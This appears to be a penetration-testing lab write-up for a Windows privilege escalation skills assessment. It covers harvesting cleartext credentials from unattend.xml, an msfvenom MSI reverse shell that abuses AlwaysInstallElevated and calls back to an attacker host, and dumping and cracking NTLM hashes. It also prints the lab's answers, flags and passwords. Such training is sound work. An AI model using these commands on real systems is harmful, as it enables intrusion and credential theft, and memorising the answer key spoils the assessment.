## ID
671

## Module
Windows Privilege Escalation

## Kind
lab

## Title
Skills Assessment — Part II (Unattend.xml + AlwaysInstallElevated)

## Description
Discover cleartext domain admin credentials in an unattend.xml file, escalate to SYSTEM via a malicious MSI (AlwaysInstallElevated), and crack a disabled local admin's NTLM hash with Hashcat.

## Tags
unattend-xml, alwaysinstallelevated, msfvenom, pwdump, hashcat, credential-hunting

## Commands
- xfreerdp /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution
- findstr /spin "iamtheadministrator" *.*
- type C:\Windows\Panther\unattend.xml
- msfvenom -p windows/shell_reverse_tcp lhost=<PWNIP> lport=<PORT> -f msi > aie.msi
- curl http://<PWNIP>:<PORT>/aie.msi -o "C:\Users\htb-student\Desktop\aie.msi"
- nc -lvnp <PORT>
- C:\Users\htb-student\desktop\pwdump8.exe
- hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt

## What This Section Covers
This assessment focuses on a Windows 10 gold image security review. It covers hunting for cleartext credentials left behind in system configuration files (unattend.xml), exploiting the AlwaysInstallElevated misconfiguration to get a SYSTEM shell via a malicious MSI, and dumping + cracking local account NTLM hashes to identify weak passwords on disabled admin accounts.

## Methodology
1. RDP into the target as `htb-student:HTB_@cademy_stdnt!`.
2. Open Command Prompt and use `findstr /spin "iamtheadministrator" *.*` from `C:\` to search for cleartext creds across the filesystem.
3. Notice hits pointing to `C:\Windows\Panther` — navigate there and `type unattend.xml`.
4. Extract the `iamtheadministrator` password (`Inl@n3fr3ight_sup3rAdm1n!`) from the `<UserAccounts>` XML block.
5. On Pwnbox, generate a malicious MSI reverse shell with `msfvenom -p windows/shell_reverse_tcp -f msi`.
6. Host the MSI with `python3 -m http.server`.
7. On the target via PowerShell, download the MSI with `curl`.
8. Start an `nc` listener on Pwnbox on the matching port.
9. Double-click the MSI on the target Desktop — the AlwaysInstallElevated policy installs it as SYSTEM.
10. Catch the SYSTEM shell on the nc listener.
11. Read `flag.txt` from `C:\Users\Administrator\Desktop\`.
12. Download `pwdump8.exe` to the target and run it from the SYSTEM shell to dump all local NTLM hashes.
13. Identify the disabled local admin `wksadmin` and copy its NTLM hash (`5835048CE94AD0564E29A924A03510EF`).
14. Crack with `hashcat -m 1000` against `rockyou.txt`.

## Multi-step Workflow (optional)
```
# On Pwnbox — generate MSI payload + prep tools
msfvenom -p windows/shell_reverse_tcp lhost=<PWNIP> lport=9443 -f msi > aie.msi
wget https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
unzip pwdump8-8.2.zip
cp pwdump8/pwdump8.exe .
python3 -m http.server 8000

# On target (PowerShell) — download MSI + pwdump
curl http://<PWNIP>:8000/aie.msi -o "C:\Users\htb-student\Desktop\aie.msi"
curl http://<PWNIP>:8000/pwdump8.exe -o "C:\Users\htb-student\Desktop\pwdump8.exe"

# On Pwnbox — catch shell
nc -lvnp 9443

# From SYSTEM shell — dump hashes
C:\Users\htb-student\desktop\pwdump8.exe

# On Pwnbox — crack wksadmin hash
hashcat -m 1000 5835048CE94AD0564E29A924A03510EF /usr/share/wordlists/rockyou.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — iamtheadministrator password | Inl@n3fr3ight_sup3rAdm1n! | `findstr /spin` → `C:\Windows\Panther\unattend.xml` `<UserAccounts>` block |
| Q2 — flag.txt on Admin Desktop | el3vatEd_1nstall$_v3ry_r1sky | `type C:\Users\Administrator\Desktop\flag.txt` from SYSTEM shell |
| Q3 — wksadmin cleartext password | password1 | `pwdump8.exe` → NTLM `5835048CE94AD0564E29A924A03510EF` → `hashcat -m 1000` with rockyou.txt |

## Key Takeaways
- `C:\Windows\Panther\unattend.xml` is a classic credential-hunting location — always check it. It often contains plaintext passwords from automated Windows deployments.
- `findstr /spin "<keyword>" *.*` is the go-to Windows command for recursive credential searching (`/s` = recursive, `/p` = skip non-printable, `/i` = case-insensitive, `/n` = line numbers).
- AlwaysInstallElevated is a GPO misconfiguration where MSI packages install as SYSTEM regardless of the user's privilege level — trivial to exploit with `msfvenom -f msi`.
- Disabled accounts still have crackable NTLM hashes — always dump and report them because the same password may be reused on other systems.
- `pwdump8` runs from a SYSTEM shell to extract all local SAM hashes without needing to copy the SAM/SYSTEM hives manually.
- NTLM hashes crack with `hashcat -m 1000` — no salt, so weak passwords fall instantly.

## Gotchas
- The target has **no internet access** — all tools (MSI payload, pwdump8) must be transferred from Pwnbox via HTTP server.
- `findstr` will print "Cannot open" errors for locked system files — ignore these and look for actual matches in the output.
- The MSI must be **double-clicked** (executed via Windows Installer) on the target, not run from command line with `msiexec`, for the AlwaysInstallElevated policy to kick in and grant SYSTEM.
- `pwdump8.exe` must be run from the **SYSTEM shell** (the reverse shell), not from the RDP session as `htb-student` — otherwise you won't have privileges to read the SAM.
- The disabled admin account is `wksadmin` (not `Administrator`) — check `net user` output to identify which accounts are disabled.
